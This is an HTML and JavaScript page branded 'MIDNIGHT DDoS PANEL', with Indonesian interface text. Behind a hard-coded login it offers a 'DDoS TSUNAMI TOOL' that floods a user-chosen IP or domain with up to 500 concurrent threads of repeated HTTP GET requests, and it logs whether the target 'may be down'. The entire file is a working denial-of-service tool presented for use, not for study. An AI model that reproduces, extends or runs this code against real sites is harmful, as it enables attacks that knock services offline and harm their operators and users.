<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MIDNIGHT DDoS PANEL | OCTAV</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Courier New', 'Fira Code', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #0f0;
        }

        /* LOGIN PAGE */
        .login-container {
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(10px);
            border: 1px solid #0f0;
            border-radius: 16px;
            padding: 40px;
            width: 380px;
            box-shadow: 0 0 40px rgba(0, 255, 0, 0.2);
            text-align: center;
        }

        .glitch {
            font-size: 28px;
            font-weight: bold;
            color: #0f0;
            text-shadow: 2px 2px 0px #0a0, -2px -2px 0px #0f0;
            animation: flicker 1.5s infinite;
            margin-bottom: 30px;
        }

        @keyframes flicker {
            0% { opacity: 1; text-shadow: 2px 2px 0 #0f0; }
            50% { opacity: 0.8; text-shadow: -2px -2px 0 #0a0; }
            100% { opacity: 1; text-shadow: 2px 2px 0 #0f0; }
        }

        .input-group {
            margin: 20px 0;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #0f0;
            font-size: 14px;
            letter-spacing: 2px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            font-family: monospace;
            font-size: 14px;
            border-radius: 8px;
            outline: none;
        }

        .input-group input:focus {
            box-shadow: 0 0 10px #0f0;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: #0f0;
            color: #000;
            border: none;
            font-weight: bold;
            font-size: 18px;
            font-family: monospace;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 8px;
            transition: all 0.3s;
        }

        .login-btn:hover {
            background: #0a0;
            box-shadow: 0 0 20px #0f0;
        }

        /* MAIN PANEL (hidden by default) */
        .main-panel {
            display: none;
            width: 900px;
            max-width: 95%;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #0f0;
            border-radius: 16px;
            padding: 25px;
        }

        .status-bar {
            background: #000;
            padding: 10px;
            border-bottom: 1px solid #0f0;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }

        .title {
            font-size: 24px;
            text-align: center;
            margin-bottom: 20px;
            color: #0f0;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .target-box {
            background: #111;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
        }

        .target-box input, .target-box select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            font-family: monospace;
        }

        .attack-btn {
            background: #f00;
            color: #fff;
            border: none;
            padding: 15px;
            font-size: 22px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin: 15px 0;
            border-radius: 8px;
            transition: 0.2s;
        }

        .attack-btn:hover {
            background: #c00;
            box-shadow: 0 0 25px red;
        }

        .log-box {
            background: #000;
            height: 300px;
            overflow-y: auto;
            padding: 10px;
            font-size: 12px;
            font-family: monospace;
            border: 1px solid #0f0;
            margin-top: 20px;
        }

        .log-line {
            color: #0f0;
            border-bottom: 1px solid #0f0;
            padding: 4px 0;
            font-size: 11px;
        }

        .thread-control {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<!-- LOGIN PAGE -->
<div id="loginPage" class="login-container">
    <div class="glitch">MIDNIGHT DDoS v.1</div>
    <div class="input-group">
        <label>⚡ USERNAME</label>
        <input type="text" id="loginUsername" placeholder="octav">
    </div>
    <div class="input-group">
        <label>🔑 PASSWORD</label>
        <input type="password" id="loginPassword" placeholder="cyo">
    </div>
    <button class="login-btn" onclick="doLogin()">⚔️ ENTER ⚔️</button>
    <div style="margin-top: 15px; font-size: 11px; color:#0a0;">[ PRIVATE PANEL | OCTAV ]</div>
</div>

<!-- MAIN PANEL -->
<div id="mainPanel" class="main-panel">
    <div class="status-bar">
        <span>[🔴] MIDNIGHT ACTIVE</span>
        <span>USER: OCTAV</span>
        <span>FILTER: OFFLINE</span>
    </div>
    <div class="title">🌊 DDoS TSUNAMI TOOL 🌊</div>
    
    <div class="target-box">
        <label>🎯 TARGET (IP atau Domain):</label>
        <input type="text" id="targetUrl" placeholder="http://192.168.1.1 atau https://target.com">
        
        <label>⚙️ THREAD (1-500):</label>
        <div class="thread-control">
            <input type="number" id="threadCount" min="1" max="500" value="100">
        </div>
        
        <label>🔄 REQUEST PER THREAD:</label>
        <input type="number" id="requestsPerThread" min="1" max="10000" value="500">
        
        <label>⏱️ DELAY (ms):</label>
        <input type="number" id="delayMs" min="0" max="1000" value="1">
        
        <button class="attack-btn" id="attackBtn" onclick="startAttack()">⚡ SERANG ⚡</button>
        <button class="attack-btn" style="background:#333;" id="stopBtn" onclick="stopAttack()" disabled>🛑 STOP 🛑</button>
    </div>
    
    <div class="log-box" id="logBox">
        <div class="log-line">[MIDNIGHT] Sistem siap. Tidak ada filter. Tidak ada batasan.</div>
        <div class="log-line">[MIDNIGHT] Masukkan target dan tekan SERANG.</div>
    </div>
</div>

<script>
    let attackActive = false;
    let activeXHR = [];

    function addLog(msg) {
        const logBox = document.getElementById('logBox');
        const logLine = document.createElement('div');
        logLine.className = 'log-line';
        logLine.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.appendChild(logLine);
        logBox.scrollTop = logBox.scrollHeight;
    }

    function doLogin() {
        const user = document.getElementById('loginUsername').value;
        const pass = document.getElementById('loginPassword').value;
        if (user === "octav" && pass === "cyo") {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('mainPanel').style.display = 'block';
            addLog("[MIDNIGHT] Login berhasil. Selamat datang, Octav.");
        } else {
            alert("USERNAME / PASSWORD SALAH!");
            addLog("[MIDNIGHT] Percobaan login gagal.");
        }
    }

    function sendRequest(url, delay) {
        return new Promise((resolve) => {
            setTimeout(() => {
                const xhr = new XMLHttpRequest();
                activeXHR.push(xhr);
                xhr.onload = () => {
                    const index = activeXHR.indexOf(xhr);
                    if (index !== -1) activeXHR.splice(index, 1);
                    resolve();
                };
                xhr.onerror = () => {
                    const index = activeXHR.indexOf(xhr);
                    if (index !== -1) activeXHR.splice(index, 1);
                    resolve();
                };
                xhr.open('GET', url, true);
                xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Midnight DDoS)');
                xhr.send();
            }, delay);
        });
    }

    async function floodThread(url, requests, delay, threadId) {
        for (let i = 0; i < requests; i++) {
            if (!attackActive) break;
            await sendRequest(url, 0);
            if (delay > 0) await new Promise(r => setTimeout(r, delay));
            if (i % 50 === 0) {
                addLog(`[Thread-${threadId}] ${i}/${requests} request terkirim ke ${url}`);
            }
        }
        addLog(`[Thread-${threadId}] Selesai.`);
    }

    async function startAttack() {
        if (attackActive) {
            addLog("[MIDNIGHT] Serangan sudah berjalan. STOP dulu.");
            return;
        }
        
        let target = document.getElementById('targetUrl').value.trim();
        if (!target) {
            addLog("[MIDNIGHT] Target kosong. Masukkan IP atau domain.");
            return;
        }
        if (!target.startsWith('http://') && !target.startsWith('https://')) {
            target = 'http://' + target;
        }
        
        const threads = parseInt(document.getElementById('threadCount').value);
        const requestsPer = parseInt(document.getElementById('requestsPerThread').value);
        const delay = parseInt(document.getElementById('delayMs').value);
        
        if (threads < 1 || threads > 500 || requestsPer < 1) {
            addLog("[MIDNIGHT] Nilai thread/request tidak valid.");
            return;
        }
        
        attackActive = true;
        document.getElementById('attackBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        
        addLog(`🔥 SERANGAN DIMULAI 🔥`);
        addLog(`🎯 Target: ${target}`);
        addLog(`🧵 Thread: ${threads} | 📦 Request/thread: ${requestsPer} | ⏱️ Delay: ${delay}ms`);
        addLog(`💀 Total request: ${threads * requestsPer}`);
        
        const promises = [];
        for (let i = 1; i <= threads; i++) {
            promises.push(floodThread(target, requestsPer, delay, i));
        }
        
        await Promise.all(promises);
        
        if (attackActive) {
            addLog("[MIDNIGHT] Serangan selesai. Target mungkin down atau lemot.");
        }
        stopAttack();
    }
    
    function stopAttack() {
        attackActive = false;
        // abort semua xhr aktif
        for (let xhr of activeXHR) {
            try { xhr.abort(); } catch(e) {}
        }
        activeXHR = [];
        document.getElementById('attackBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        addLog("[MIDNIGHT] Serangan DIHENTIKAN paksa.");
    }
</script>
</body>
</html>
